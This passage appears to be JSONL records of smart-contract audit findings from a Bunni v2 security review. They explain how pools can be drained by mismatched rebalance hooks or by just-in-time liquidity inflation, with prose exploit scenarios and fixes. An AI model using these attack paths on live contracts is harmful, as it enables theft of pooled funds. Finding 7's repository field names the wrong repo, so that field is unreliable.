IBunniHook.RebalanceOrderPostHookArgs({currency: outputToken})\n});\n// prehook should pull input tokens from BunniHub to BunniHook and update pool\nbalances\nIFloodPlain.Hook[] memory preHooks = new IFloodPlain.Hook[](1);\npreHooks[0] = IFloodPlain.Hook({\n target: address(this),\n data: abi.encodeCall(IBunniHook.rebalanceOrderPreHook, (hookArgs))\n});\n// posthook should push output tokens from BunniHook to BunniHub and update pool\nbalances\nIFloodPlain.Hook[] memory postHooks = new IFloodPlain.Hook[](1);\npostHooks[0] = IFloodPlain.Hook({\n target: address(this),\n data: abi.encodeCall(IBunniHook.rebalanceOrderPostHook, (hookArgs))\n});\n```\n\n\n*Figure 7.3: The hook data creation in the \\_createRebalanceOrder function ([src/lib/BunniHookLogic.sol#L696–L714](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L696-L714))*\n\n```\n // verify call came from Flood\n if (msg.sender != address(floodPlain)) {\n revert BunniHook__Unauthorized();\n }\n // ensure args can be trusted\n if (keccak256(abi.encode(hookArgs)) !=\ns.rebalanceOrderHookArgsHash[hookArgs.key.toId()]) {\n revert BunniHook__InvalidRebalanceOrderHookArgs();\n }\n```\n\n*Figure 7.4: The hook data validation in the rebalanceOrderPreHook and rebalanceOrderPostHook functions ([src/BunniHook.sol#L429–L438](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L429-L438) and [src/BunniHook.sol#L465–L474](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L465-L474))*\n\nHowever, as described in [TOB-BUNNI-6,](#page-31-0) we can provide an arbitrary order and then execute any arbitrary valid pre- and post-hook. Additionally, the functions have no way of guaranteeing that the pre- and post-hook for a particular order are executed sequentially and in the same block.\n\nDue to this, an attacker can execute a valid order's pre-hook to increase the balance of the BunniHook, and then drain the balance by executing a malicious pool's post-hook.\n", "full_markdown": "### 7. Pools can be drained via the rebalance mechanism by selectively executing the rebalanceOrderPreHook and the rebalanceOrderPostHook\n\n| Severity: High                                           | Diffi culty: Low        |\n|-------------------------------------------------------------|-------------------------------|\n| Type: Data Validation                                 | Finding ID: TOB-BUNNI-7 |\n| Target: src/BunniHook.sol, src/lib/BunniHookLogic.sol |                               |\n\n#### Description\n\nAny pool that has an active rebalance order can be drained because the BunniHook does not enforce that a rebalanceOrderPreHook and rebalanceOrderPostHook need to be executed together.\n\nWhen a rebalance order is fulfilled by using the fulfillOrder function of the FloodPlain contract, the actual data passed to the rebalanceOrderPreHook and rebalanceOrderPostHook functions is arbitrary, as shown in figures 7.1 and 7.2:\n\n```\nfunction fulfillOrder(SignedOrder calldata package) external payable nonReentrant {\n Order calldata order = package.order;\n bytes32 orderHash = order.hash();\n // Check zone accepts the fulfiller. Fulfiller is msg.sender in direct fills.\n if (order.zone != address(0)) if (!(IZone(order.zone).validate(order,\nmsg.sender))) revert ZoneDenied();\n // Execute pre hooks.\n order.preHooks.execute();\n // Transfer each offer item to msg.sender using Permit2.\n _permitTransferOffer(order, package.signature, orderHash, msg.sender);\n // Transfer consideration item from msg.sender to offerer.\n uint256 amount = order.consideration.amount;\n IERC20(order.consideration.token).safeTransferFrom(msg.sender, order.recipient,\namount);\n // Execute post hooks.\n order.postHooks.execute();\n // Emit an event signifying that the order has been fulfilled.\n emit OrderFulfilled(orderHash, order.zone, msg.sender, amount);\n}\n```\n\n*Figure 7.1: The fulfillOrder function ([flood-contracts/master/src/FloodPlain.sol#L55–L78](https://github.com/flood-protocol/flood-contracts/blob/c9891965b29f8e32ed00d9b98356a0833f806e18/src/FloodPlain.sol#L55-L78))*\n\n\n```\nfunction execute(IFloodPlain.Hook calldata hook) internal {\n address target = hook.target;\n bytes calldata data = hook.data;\n bytes28 extension;\n assembly (\"memory-safe\") {\n extension := shl(32, calldataload(data.offset))\n }\n require(extension != SELECTOR_EXTENSION, \"MALICIOUS_CALL\");\n assembly (\"memory-safe\") {\n let fmp := mload(0x40)\n calldatacopy(fmp, data.offset, data.length)\n if iszero(call(gas(), target, 0, fmp, data.length, 0, 0)) {\n returndatacopy(0, 0, returndatasize())\n revert(0, returndatasize())\n }\n }\n}\n```\n\n*Figure 7.2: The execute function called on the preHooks and postHooks array elements ([flood-contracts/master/src/lib/Hooks.sol#L9–L27](https://github.com/flood-protocol/flood-contracts/blob/c9891965b29f8e32ed00d9b98356a0833f806e18/src/libraries/Hooks.sol#L9-L27))*\n\nThe rebalanceOrderPreHook and rebalanceOrderPostHook functions do check that the data provided matches the hash of both order hooks in the respective functions, as shown in figures 7.3 and 7.4:\n\n```\nIBunniHook.RebalanceOrderHookArgs memory hookArgs =\nIBunniHook.RebalanceOrderHookArgs({\n key: key,\n preHookArgs: IBunniHook.RebalanceOrderPreHookArgs({currency: inputToken, amount:\ninputAmount}),\n postHookArgs: IBunniHook.RebalanceOrderPostHookArgs({currency: outputToken})\n});\n// prehook should pull input tokens from BunniHub to BunniHook and update pool\nbalances\nIFloodPlain.Hook[] memory preHooks = new IFloodPlain.Hook[](1);\npreHooks[0] = IFloodPlain.Hook({\n target: address(this),\n data: abi.encodeCall(IBunniHook.rebalanceOrderPreHook, (hookArgs))\n});\n// posthook should push output tokens from BunniHook to BunniHub and update pool\nbalances\nIFloodPlain.Hook[] memory postHooks = new IFloodPlain.Hook[](1);\npostHooks[0] = IFloodPlain.Hook({\n target: address(this),\n data: abi.encodeCall(IBunniHook.rebalanceOrderPostHook, (hookArgs))\n});\n```\n\n\n*Figure 7.3: The hook data creation in the \\_createRebalanceOrder function ([src/lib/BunniHookLogic.sol#L696–L714](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L696-L714))*\n\n```\n // verify call came from Flood\n if (msg.sender != address(floodPlain)) {\n revert BunniHook__Unauthorized();\n }\n // ensure args can be trusted\n if (keccak256(abi.encode(hookArgs)) !=\ns.rebalanceOrderHookArgsHash[hookArgs.key.toId()]) {\n revert BunniHook__InvalidRebalanceOrderHookArgs();\n }\n```\n\n*Figure 7.4: The hook data validation in the rebalanceOrderPreHook and rebalanceOrderPostHook functions ([src/BunniHook.sol#L429–L438](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L429-L438) and [src/BunniHook.sol#L465–L474](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L465-L474))*\n\nHowever, as described in [TOB-BUNNI-6,](#page-31-0) we can provide an arbitrary order and then execute any arbitrary valid pre- and post-hook. Additionally, the functions have no way of guaranteeing that the pre- and post-hook for a particular order are executed sequentially and in the same block.\n\nDue to this, an attacker can execute a valid order's pre-hook to increase the balance of the BunniHook, and then drain the balance by executing a malicious pool's post-hook.\n\n#### Exploit Scenario\n\nA pool contains 10,000 USDC and 20,000 USDT, and a rebalance order is created to sell 5,000 USDT and get 5,000 USDC. Eve creates a pool using the same BunniHook, one malicious token, and USDT. She then creates a fake order, signs it, and submits it to the fulfillOrder function of the FloodPlain contract.\n\nThe valid pre-hook of the honest pool is executed first, increasing the BunniHook balance by 5,000 USDT; then the malicious post-hook is executed, increasing the balance of Eve's pool by 5,000 USDT. Eve then withdraws the liquidity from her malicious pool and steals the 5,000 USDT. She can repeat this action until she fully drains the USDT balance of the honest pool, and then performs swaps in order to drain the other half of the pool.\n\n#### Recommendations\n\nShort term, add a stateful mechanism to the execution of pre- and post-hooks to ensure that they must be executed together.\n\nLong term, redesign the rebalance flow to connect the validation and execution of the rebalance actions. Ensure that this feature is thoroughly tested for common adversarial situations.\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-7", "target": {"path": "src/BunniHook.sol, src/lib/BunniHookLogic.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Uniswap/v4-core", "org": "Uniswap", "name": "v4-core", "commit": "9293e5ab1deed87e03c176d8af94b1af19eb3900", "branch": null, "relative_file": "src/BunniHook.sol, src/lib/BunniHookLogic.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-7", "Target": "src/BunniHook.sol, src/lib/BunniHookLogic.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-008", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 8, "page_start": 38, "title": "Missing maximum bounds for rebalance parameters", "short_summary": null, "description_md": "#### Description\n\nThe rebalance parameter validation lacks maximum bounds. This could allow the parameters to be so large that it affects the correct function of the pool.\n\nWhen a pool and BunniToken are deployed by using the deployBunniToken function of the BunniHub contract, the parameters for rebalancing are validated using the hooks contract, as shown in figure 8.1:\n\n```\nfunction deployBunniToken(HubStorage storage s, Env calldata env,\nIBunniHub.DeployBunniTokenParams calldata params)\n external\n returns (IBunniToken token, PoolKey memory key)\n{\n //...\n // ensure hook params are valid\n if (address(params.hooks) == address(0)) revert BunniHub__HookCannotBeZero();\n if (!params.hooks.isValidParams(params.hookParams)) revert\nBunniHub__InvalidHookParams();\n```\n\n*Figure 8.1: Validation of the rebalance parameters when deploying a pool ([src/lib/BunniHubLogic.sol#L489–L490](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHubLogic.sol#L489-L490))*\n\nIf the hooks contract is the BunniHook contract, the validation ensures that either all or none of the values are set, as shown in figure 8.2:\n\n```\nfunction isValidParams(bytes calldata hookParams) external pure override returns\n(bool) {\n DecodedHookParams memory p = BunniHookLogic.decodeHookParams(hookParams);\n unchecked {\n return (p.feeMin <= p.feeMax) && (p.feeMax < SWAP_FEE_BASE)\n && (p.feeQuadraticMultiplier == 0 || p.feeMin == p.feeMax ||\np.feeTwapSecondsAgo != 0)\n && (p.surgeFee < SWAP_FEE_BASE)\n && (uint256(p.surgeFeeHalfLife) * uint256(p.vaultSurgeThreshold0) *\nuint256(p.vaultSurgeThreshold1) != 0)\n```\n\n\n```\n && (\n (\n p.rebalanceThreshold == 0 && p.rebalanceMaxSlippage == 0 &&\np.rebalanceTwapSecondsAgo == 0\n && p.rebalanceOrderTTL == 0\n )\n || (\n p.rebalanceThreshold != 0 && p.rebalanceMaxSlippage != 0 &&\np.rebalanceTwapSecondsAgo != 0\n && p.rebalanceOrderTTL != 0\n )\n ) && (p.oracleMinInterval != 0);\n }\n}\n```\n\n*Figure 8.2: The rebalance parameter validation in the isValidParams function ([src/BunniHook.sol#L319–L337](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L319-L337))*\n\nHowever, there are no maximum bounds placed on these values, other than the inherent bounds of their types. This means that a user can potentially deploy a pool with rebalance parameters that would prevent the pool from working correctly.\n", "full_markdown": "# 8. Missing maximum bounds for rebalance parameters Severity: **Informational** Difficulty: **Medium** Type: Data Validation Finding ID: TOB-BUNNI-8 Target: src/BunniHook.sol\n\n#### Description\n\nThe rebalance parameter validation lacks maximum bounds. This could allow the parameters to be so large that it affects the correct function of the pool.\n\nWhen a pool and BunniToken are deployed by using the deployBunniToken function of the BunniHub contract, the parameters for rebalancing are validated using the hooks contract, as shown in figure 8.1:\n\n```\nfunction deployBunniToken(HubStorage storage s, Env calldata env,\nIBunniHub.DeployBunniTokenParams calldata params)\n external\n returns (IBunniToken token, PoolKey memory key)\n{\n //...\n // ensure hook params are valid\n if (address(params.hooks) == address(0)) revert BunniHub__HookCannotBeZero();\n if (!params.hooks.isValidParams(params.hookParams)) revert\nBunniHub__InvalidHookParams();\n```\n\n*Figure 8.1: Validation of the rebalance parameters when deploying a pool ([src/lib/BunniHubLogic.sol#L489–L490](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHubLogic.sol#L489-L490))*\n\nIf the hooks contract is the BunniHook contract, the validation ensures that either all or none of the values are set, as shown in figure 8.2:\n\n```\nfunction isValidParams(bytes calldata hookParams) external pure override returns\n(bool) {\n DecodedHookParams memory p = BunniHookLogic.decodeHookParams(hookParams);\n unchecked {\n return (p.feeMin <= p.feeMax) && (p.feeMax < SWAP_FEE_BASE)\n && (p.feeQuadraticMultiplier == 0 || p.feeMin == p.feeMax ||\np.feeTwapSecondsAgo != 0)\n && (p.surgeFee < SWAP_FEE_BASE)\n && (uint256(p.surgeFeeHalfLife) * uint256(p.vaultSurgeThreshold0) *\nuint256(p.vaultSurgeThreshold1) != 0)\n```\n\n\n```\n && (\n (\n p.rebalanceThreshold == 0 && p.rebalanceMaxSlippage == 0 &&\np.rebalanceTwapSecondsAgo == 0\n && p.rebalanceOrderTTL == 0\n )\n || (\n p.rebalanceThreshold != 0 && p.rebalanceMaxSlippage != 0 &&\np.rebalanceTwapSecondsAgo != 0\n && p.rebalanceOrderTTL != 0\n )\n ) && (p.oracleMinInterval != 0);\n }\n}\n```\n\n*Figure 8.2: The rebalance parameter validation in the isValidParams function ([src/BunniHook.sol#L319–L337](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L319-L337))*\n\nHowever, there are no maximum bounds placed on these values, other than the inherent bounds of their types. This means that a user can potentially deploy a pool with rebalance parameters that would prevent the pool from working correctly.\n\n#### Recommendations\n\nShort term, determine reasonable maximum bounds for the rebalanceMaxSlippage, rebalanceTwapSecondsAgo, and rebalanceOrderTTL parameters and enforce them. Clearly document these limits in the user- and developer-facing documentation.\n\nLong term, carefully document all caller-specified values in the system and ensure that they are properly constrained and documented.\n", "severity": "Informational", "difficulty": "Medium", "type": "Data Validation", "finding_id": "TOB-BUNNI-8", "target": {"path": "src/BunniHook.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/timeless-fi/bunni-v2", "org": "timeless-fi", "name": "bunni-v2", "commit": "7faae4718eecda1b33dc3abd894431ed2d16c929", "branch": null, "relative_file": "src/BunniHook.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Medium", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-8", "Target": "src/BunniHook.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-009", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 9, "page_start": 40, "title": "Excess liquidity can be inflated to create arbitrarily large rebalance orders", "short_summary": null, "description_md": "#### Description\n\nThe liquidity density functions used by Bunni v2 pools can be configured to adapt to changes in market conditions. As a result, the protocol also includes a mechanism to autonomously rebalance the holdings of a pool to maximize the liquidity available. However, the way liquidity is added and removed from pools can be leveraged to artificially inflate pool balances temporarily in order to create abnormally large and profitable rebalance orders.\n\nThe amount of liquidity in a pool can be calculated by multiplying a token's balance by the overall token density according to the LDF. Since we have two tokens per pool, each with independent balances and densities, we can infer two possible liquidity amounts (figure 9.1). Under normal conditions, these values should be approximately equal, but if the LDF shifts or morphs somehow, the densities of each token may change. Since the balances will remain constant, this means that the liquidity values implied by the balances may differ. If the difference in these liquidity estimates exceeds a pool-configured threshold (figure 9.2), a rebalance order will be issued through flood.bid that trades a portion of the excess token to increase the overall liquidity.\n\n```\ntotalDensity0X96 = density0RightOfRoundedTickX96 + density0OfRoundedTickX96;\ntotalDensity1X96 = density1LeftOfRoundedTickX96 + density1OfRoundedTickX96;\nuint256 totalLiquidityEstimate0 =\n (balance0 == 0 || totalDensity0X96 == 0) ? 0 : balance0.fullMulDiv(Q96,\ntotalDensity0X96);\nuint256 totalLiquidityEstimate1 =\n (balance1 == 0 || totalDensity1X96 == 0) ? 0 : balance1.fullMulDiv(Q96,\ntotalDensity1X96);\nif (totalLiquidityEstimate0 == 0) {\n totalLiquidity = totalLiquidityEstimate1;\n} else if (totalLiquidityEstimate1 == 0) {\n totalLiquidity = totalLiquidityEstimate0;\n} else {\n totalLiquidity = FixedPointMathLib.min(totalLiquidityEstimate0,\ntotalLiquidityEstimate1);\n}\n```\n\n*Figure 9.1: A snippet of the queryLDF function showing how totalLiquidity is calculated ([src/lib/QueryLDF.sol#L72–L84](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/QueryLDF.sol#L72-L84))*\n\n\n```\n// should rebalance if excessLiquidity / totalLiquidity >= 1 / rebalanceThreshold\nbool shouldRebalance0 =\n excessLiquidity0 != 0 && excessLiquidity0 >= totalLiquidity /\ninput.hookParams.rebalanceThreshold;\nbool shouldRebalance1 =\n excessLiquidity1 != 0 && excessLiquidity1 >= totalLiquidity /\ninput.hookParams.rebalanceThreshold;\nif (!shouldRebalance0 && !shouldRebalance1) return (false, inputToken, outputToken,\ninputAmount, outputAmount);\n```\n\n*Figure 9.2: A snippet of the \\_computeRebalanceParams function that checks if a rebalance order should be created ([src/lib/BunniHookLogic.sol#L618–L623](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L618-L623))*\n\nTo simplify the process of adding and removing liquidity after the pool has been initialized with some balance, these operations allow tokens to be added or removed from the pool only in proportion to the current balances (figure 9.3). Note that these balances include any excess liquidity; as a result, the overall proportion of excess liquidity will remain the same when liquidity is added or removed.\n\n```\n(returnData.balance0, returnData.balance1) =\n (inputData.state.rawBalance0 + reserveBalance0, inputData.state.rawBalance1 +\nreserveBalance1);\n// update TWAP oracle and optionally observe\nbool requiresLDF = returnData.balance0 == 0 && returnData.balance1 == 0;\nif (requiresLDF) {\n ...\n} else {\n // already initialized liquidity shape\n // simply add tokens at the current ratio\n // need to update: reserveAmount0, reserveAmount1, amount0, amount1\n // compute amount0 and amount1 such that the ratio is the same as the current\nratio\n uint256 amount0Desired = inputData.params.amount0Desired;\n uint256 amount1Desired = inputData.params.amount1Desired;\n uint256 balance0 = returnData.balance0;\n uint256 balance1 = returnData.balance1;\n returnData.amount0 = balance1 == 0\n ? amount0Desired\n : FixedPointMathLib.min(amount0Desired, amount1Desired.mulDiv(balance0,\nbalance1));\n returnData.amount1 = balance0 == 0\n ? amount1Desired\n : FixedPointMathLib.min(amount1Desired, amount0Desired.mulDiv(balance1,\nbalance0));\n```\n\n*Figure 9.3: A snippet of the \\_depositLogic function that shows how the token amounts to be deposited are calculated for initialized pools ([src/lib/BunniHubLogic.sol#L226–L312](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHubLogic.sol#L226-L312))*\n\n\nSince rebalance orders are emitted automatically after a swap as a result of pool/market conditions, a malicious fulfiller can anticipate when this will occur and inject a large amount of liquidity before the rebalance order is calculated, remove the liquidity after the order is issued, then fill the order himself, profiting from the slippage tolerance (figure 9.4) and leaving the pool in an incredibly unbalanced state.\n\n```\nbool willRebalanceToken0 = shouldRebalance0 && (!shouldRebalance1 ||\nexcessLiquidity0 > excessLiquidity1);\n// compute target amounts (i.e. the token amounts of the excess liquidity)\nuint256 excessLiquidity = willRebalanceToken0 ? excessLiquidity0 : excessLiquidity1;\nuint256 targetAmount0 = excessLiquidity.fullMulDiv(totalDensity0X96, Q96);\nuint256 targetAmount1 = excessLiquidity.fullMulDiv(totalDensity1X96, Q96);\n// determine input & output\n(inputToken, outputToken) = willRebalanceToken0\n ? (input.key.currency0, input.key.currency1)\n : (input.key.currency1, input.key.currency0);\nuint256 inputTokenExcessBalance =\n willRebalanceToken0 ? balance0 - currentActiveBalance0 : balance1 -\ncurrentActiveBalance1;\nuint256 inputTokenTarget = willRebalanceToken0 ? targetAmount0 : targetAmount1;\nuint256 outputTokenTarget = willRebalanceToken0 ? targetAmount1 : targetAmount0;\nif (inputTokenExcessBalance < inputTokenTarget) {\n // should never happen\n return (false, inputToken, outputToken, inputAmount, outputAmount);\n}\ninputAmount = inputTokenExcessBalance - inputTokenTarget;\noutputAmount = outputTokenTarget.mulDivUp(1e5 -\ninput.hookParams.rebalanceMaxSlippage, 1e5);\n```\n\n*Figure 9.4: A snippet of the \\_computeRebalanceParams function that shows the calculation of the amounts of tokens for the rebalance order ([src/lib/BunniHookLogic.sol#L652–L672](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L652-L672))*\n\nIf there is an active AmAmm manager, withdrawals would be subject to a timeout window, but the version of the code under review has a known issue that allows this to be bypassed. Since the AmAmm manager is also included on the allowlist of fulfillers, this would allow arbitrary attackers to fulfill orders provided they win the AmAmm auction 24 hours in advance. Otherwise, any allowlisted fulfiller would be able to execute this attack.\n\nAdditionally, regular depositors could use flash loans to provide just-in-time liquidity to inflate the rebalance order to require a greater amount of tokens than would naturally be in the pool, requiring fulfillers to also take the extra step of providing just-in-time liquidity back into the pool to carry out the rebalance, resulting in a swap that is less profitable than it appeared based on the order parameters alone.\n", "full_markdown": "### 9. Excess liquidity can be inflated to create arbitrarily large rebalance orders\n\n| Severity: High                                                   | Diffi culty: Low        |\n|---------------------------------------------------------------------|-------------------------------|\n| Type: Data Validation                                         | Finding ID: TOB-BUNNI-9 |\n| Target: src/lib/BunniHookLogic.sol, src/lib/BunniHubLogic.sol |                               |\n\n#### Description\n\nThe liquidity density functions used by Bunni v2 pools can be configured to adapt to changes in market conditions. As a result, the protocol also includes a mechanism to autonomously rebalance the holdings of a pool to maximize the liquidity available. However, the way liquidity is added and removed from pools can be leveraged to artificially inflate pool balances temporarily in order to create abnormally large and profitable rebalance orders.\n\nThe amount of liquidity in a pool can be calculated by multiplying a token's balance by the overall token density according to the LDF. Since we have two tokens per pool, each with independent balances and densities, we can infer two possible liquidity amounts (figure 9.1). Under normal conditions, these values should be approximately equal, but if the LDF shifts or morphs somehow, the densities of each token may change. Since the balances will remain constant, this means that the liquidity values implied by the balances may differ. If the difference in these liquidity estimates exceeds a pool-configured threshold (figure 9.2), a rebalance order will be issued through flood.bid that trades a portion of the excess token to increase the overall liquidity.\n\n```\ntotalDensity0X96 = density0RightOfRoundedTickX96 + density0OfRoundedTickX96;\ntotalDensity1X96 = density1LeftOfRoundedTickX96 + density1OfRoundedTickX96;\nuint256 totalLiquidityEstimate0 =\n (balance0 == 0 || totalDensity0X96 == 0) ? 0 : balance0.fullMulDiv(Q96,\ntotalDensity0X96);\nuint256 totalLiquidityEstimate1 =\n (balance1 == 0 || totalDensity1X96 == 0) ? 0 : balance1.fullMulDiv(Q96,\ntotalDensity1X96);\nif (totalLiquidityEstimate0 == 0) {\n totalLiquidity = totalLiquidityEstimate1;\n} else if (totalLiquidityEstimate1 == 0) {\n totalLiquidity = totalLiquidityEstimate0;\n} else {\n totalLiquidity = FixedPointMathLib.min(totalLiquidityEstimate0,\ntotalLiquidityEstimate1);\n}\n```\n\n*Figure 9.1: A snippet of the queryLDF function showing how totalLiquidity is calculated ([src/lib/QueryLDF.sol#L72–L84](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/QueryLDF.sol#L72-L84))*\n\n\n```\n// should rebalance if excessLiquidity / totalLiquidity >= 1 / rebalanceThreshold\nbool shouldRebalance0 =\n excessLiquidity0 != 0 && excessLiquidity0 >= totalLiquidity /\ninput.hookParams.rebalanceThreshold;\nbool shouldRebalance1 =\n excessLiquidity1 != 0 && excessLiquidity1 >= totalLiquidity /\ninput.hookParams.rebalanceThreshold;\nif (!shouldRebalance0 && !shouldRebalance1) return (false, inputToken, outputToken,\ninputAmount, outputAmount);\n```\n\n*Figure 9.2: A snippet of the \\_computeRebalanceParams function that checks if a rebalance order should be created ([src/lib/BunniHookLogic.sol#L618–L623](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L618-L623))*\n\nTo simplify the process of adding and removing liquidity after the pool has been initialized with some balance, these operations allow tokens to be added or removed from the pool only in proportion to the current balances (figure 9.3). Note that these balances include any excess liquidity; as a result, the overall proportion of excess liquidity will remain the same when liquidity is added or removed.\n\n```\n(returnData.balance0, returnData.balance1) =\n (inputData.state.rawBalance0 + reserveBalance0, inputData.state.rawBalance1 +\nreserveBalance1);\n// update TWAP oracle and optionally observe\nbool requiresLDF = returnData.balance0 == 0 && returnData.balance1 == 0;\nif (requiresLDF) {\n ...\n} else {\n // already initialized liquidity shape\n // simply add tokens at the current ratio\n // need to update: reserveAmount0, reserveAmount1, amount0, amount1\n // compute amount0 and amount1 such that the ratio is the same as the current\nratio\n uint256 amount0Desired = inputData.params.amount0Desired;\n uint256 amount1Desired = inputData.params.amount1Desired;\n uint256 balance0 = returnData.balance0;\n uint256 balance1 = returnData.balance1;\n returnData.amount0 = balance1 == 0\n ? amount0Desired\n : FixedPointMathLib.min(amount0Desired, amount1Desired.mulDiv(balance0,\nbalance1));\n returnData.amount1 = balance0 == 0\n ? amount1Desired\n : FixedPointMathLib.min(amount1Desired, amount0Desired.mulDiv(balance1,\nbalance0));\n```\n\n*Figure 9.3: A snippet of the \\_depositLogic function that shows how the token amounts to be deposited are calculated for initialized pools ([src/lib/BunniHubLogic.sol#L226–L312](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHubLogic.sol#L226-L312))*\n\n\nSince rebalance orders are emitted automatically after a swap as a result of pool/market conditions, a malicious fulfiller can anticipate when this will occur and inject a large amount of liquidity before the rebalance order is calculated, remove the liquidity after the order is issued, then fill the order himself, profiting from the slippage tolerance (figure 9.4) and leaving the pool in an incredibly unbalanced state.\n\n```\nbool willRebalanceToken0 = shouldRebalance0 && (!shouldRebalance1 ||\nexcessLiquidity0 > excessLiquidity1);\n// compute target amounts (i.e. the token amounts of the excess liquidity)\nuint256 excessLiquidity = willRebalanceToken0 ? excessLiquidity0 : excessLiquidity1;\nuint256 targetAmount0 = excessLiquidity.fullMulDiv(totalDensity0X96, Q96);\nuint256 targetAmount1 = excessLiquidity.fullMulDiv(totalDensity1X96, Q96);\n// determine input & output\n(inputToken, outputToken) = willRebalanceToken0\n ? (input.key.currency0, input.key.currency1)\n : (input.key.currency1, input.key.currency0);\nuint256 inputTokenExcessBalance =\n willRebalanceToken0 ? balance0 - currentActiveBalance0 : balance1 -\ncurrentActiveBalance1;\nuint256 inputTokenTarget = willRebalanceToken0 ? targetAmount0 : targetAmount1;\nuint256 outputTokenTarget = willRebalanceToken0 ? targetAmount1 : targetAmount0;\nif (inputTokenExcessBalance < inputTokenTarget) {\n // should never happen\n return (false, inputToken, outputToken, inputAmount, outputAmount);\n}\ninputAmount = inputTokenExcessBalance - inputTokenTarget;\noutputAmount = outputTokenTarget.mulDivUp(1e5 -\ninput.hookParams.rebalanceMaxSlippage, 1e5);\n```\n\n*Figure 9.4: A snippet of the \\_computeRebalanceParams function that shows the calculation of the amounts of tokens for the rebalance order ([src/lib/BunniHookLogic.sol#L652–L672](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L652-L672))*\n\nIf there is an active AmAmm manager, withdrawals would be subject to a timeout window, but the version of the code under review has a known issue that allows this to be bypassed. Since the AmAmm manager is also included on the allowlist of fulfillers, this would allow arbitrary attackers to fulfill orders provided they win the AmAmm auction 24 hours in advance. Otherwise, any allowlisted fulfiller would be able to execute this attack.\n\nAdditionally, regular depositors could use flash loans to provide just-in-time liquidity to inflate the rebalance order to require a greater amount of tokens than would naturally be in the pool, requiring fulfillers to also take the extra step of providing just-in-time liquidity back into the pool to carry out the rebalance, resulting in a swap that is less profitable than it appeared based on the order parameters alone.\n\n#### Exploit Scenario\n\nA pool's LDF shifts and has 120 TokenA and 100 TokenB, but the active balance of TokenA is only 100. Alice, a malicious fulfiller, notices that the pool will rebalance and deposits 1,080\n\n\n\nTokenA and 900 TokenB so the pool has 1,200 TokenA and 1,000 TokenB in total. She makes a small swap to trigger the creation of a rebalance order. This pool has a 5% rebalance slippage tolerance so the rebalance order will sell 100 TokenA for 95 TokenB. Alice withdraws all of her original liquidity and immediately fills the rebalance order. As a result, the pool has 20 TokenA and 195 TokenB. If Alice had not provided just-in-time liquidity, the pool would have only swapped 10 TokenA for 9.5 TokenB and ended at a total of 110 TokenA and 109.5 TokenB. 